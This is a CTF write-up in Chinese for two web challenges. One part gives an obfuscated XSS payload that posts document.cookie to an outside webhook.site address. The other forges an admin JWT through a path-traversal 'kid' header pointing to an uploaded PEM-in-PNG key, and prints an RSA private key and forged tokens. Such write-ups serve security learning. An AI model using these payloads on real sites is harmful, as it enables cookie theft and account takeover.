# web
### b01ler-ad
post `/review`接口,会有一个浏览器来访问http://localhost:3000/admin/view?content?=${content}
,发送一个html文档,

过滤了' " \` 使用String.fromCharCode绕过
 应该是xss读cookie,就是直接发个html,fetch,注意加个no-cors,不然无法跨域

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>upload</title>
</head>
<body>
<script>
eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,97,50,48,99,57,102,57,100,45,98,53,48,54,45,52,97,56,97,45,57,51,100,97,45,99,101,53,52,102,100,56,55,100,48,54,97,39,44,123,109,101,116,104,111,100,58,39,80,79,83,84,39,44,109,111,100,101,58,39,110,111,45,99,111,114,115,39,44,98,111,100,121,58,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,41))</script>

</body>
</html>
```
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413232240.png)

### imagehost
flag在上传的png里,登录为admin即可
`FLAG_FILENAME="$(python3 -c 'import uuid;print(uuid.uuid4())').png"`

Route("/", home),   主页,jwt鉴权,给出当前用户所有上传的照片
Route("/login", login_get), 返回login.html,jinjia2渲染无ssti
Route("/login", login, methods=["POST"]),    传入用户名/密码,fetchone,设置jwt里userid和admin
Route("/register", register_get),             register.html
Route("/register", register, methods=["POST"]),   insert,参数化
Route("/logout", logout),                  
Route("/", upload, methods=["POST"]),        上传文件,
Route("/view/{filename}", view),   
```python
async def view(request):
	filename = request.path_params["filename"]
	
	path = UPLOAD_FOLDER.joinpath("a").with_name(filename)
	if not path.exists():
		return PlainTextResponse("Image not found", 404)
	
	return FileResponse(UPLOAD_FOLDER.joinpath("a").with_name(filename))
```

需要伪造admin用户,使用的是非对称加密,且公钥(decode)的文件位置可指定,能否通过upload上传公钥文件,,且pem还要符合png的标准

我为我的无知道歉,pem的格式是这样的
```pem
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCT96Ir3DM+PtlpHqyI8YOBOKyAexIO5RMpwUgUndIRBs72g0Ga
Tyy8yxKbMCaJ2nLQBC9D6cOp8UzHBeirsk0rYETGQBFqHzOvjod3VjE+9eRMJGl7
oohwHUzqHUOoNDKLvz2HuoVtRHawfw4EHCx9OTNyWct7jjg9VV0EEz9IdQIDAQAB
AoGAbFR3kZ70kVTYPYLslJIlUj0Y5jO0Y91Iq2BLknR9MGQIsCgmpn/i5BHU/HND
M9gQCMWXiSQjUU9Ng8SKtPGkVsl22mNZkRb69Ca1083pI2HxwL3dhEXl+VLD37w+
Cg+9glWnsjdUFy8WoiTun0yWJHiXKN2VRCv759+vJS6M150CQQDDQt2HoKEKVsU1
RLyRpr93Idtmzplro48zsvsmuCZJyNnpn4VYz7BFvu7SDX4Xkz1dr9gELnTvnQY3
rBWNQOXzAkEAwf6jpDFa+JL9/CLLTxuwn51Or8C4zcd1LjrmsqWz8SYDnuAZo4Vg
A2MlVAYpbk1XfVWzGPxralsa9+Zrl9yp9wJATmQe2h+T57m0TNF+vx7pyWNPWTPi
hkNQ75mQmRffT0oSqmd/uosPIsEn0i7Wi5JyVZWOLQeVrMkmwN0WffIrHwJBAIM2
4Sil2YpYokJwpmOTrxvHIvntuRI23yOt42zid5ucwsYrfiwEgrTH0u/KWyuoVI0J
8mHsGhuOE+epiwzkzHECQCN3G0+GcCfE6eYF5yW19n7QoK3sxU5HbwXKoAeXgM0z
TEiGjWVM5w+Ea21IUsE2O2CIG1CePqUI2DSujYCo7Oc=
-----END RSA PRIVATE KEY-----
```
或者说view路由读取公钥文件?

实践出真知!!!,只要不破坏pem文件格式也可以解析
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414025437.png)

类似于图片马的制作
生成一个公私钥,然后使用私钥加密
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414031105.png)

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6bnVsbCwiaWF0IjoxNzEzMDM1NDA0fQ.h1QmHfqXz0YHlhOjqgohwpzfQ4ugCkHS9fQaBOmcqyg237NctYZ-SS4H0oRYhM8VEywSgmGohIpNrM-Pw7dU8jedoxru9stQYbCoIKyB9tQFFkLbBXysBLp7N3UoxPnzHxD5ilhvaWaXy2v1orNXs1YYwIOJ4gE_Au3GUXEOlBY
```

然后修改头部
`{'alg': 'RS256', 'kid': '../../../../../../../../uploads/cf00f2ee-4886-4d6c-8e4c-30bde26c76f4.png', 'typ': 'JWT'}`
base64后为
`eydhbGcnOiAnUlMyNTYnLCAna2lkJzogJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvY2YwMGYyZWUtNDg4Ni00ZDZjLThlNGMtMzBiZGUyNmM3NmY0LnBuZycsICd0eXAnOiAnSldUJ30=`

最终得到
eydhbGcnOiAnUlMyNTYnLCAna2lkJzogJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvY2YwMGYyZWUtNDg4Ni00ZDZjLThlNGMtMzBiZGUyNmM3NmY0LnBuZycsICd0eXAnOiAnSldUJ30.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6bnVsbCwiaWF0IjoxNzEzMDM1NDA0fQ.h1QmHfqXz0YHlhOjqgohwpzfQ4ugCkHS9fQaBOmcqyg237NctYZ-SS4H0oRYhM8VEywSgmGohIpNrM-Pw7dU8jedoxru9stQYbCoIKyB9tQFFkLbBXysBLp7N3UoxPnzHxD5ilhvaWaXy2v1orNXs1YYwIOJ4gE_Au3GUXEOlBY


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-04-13   22:21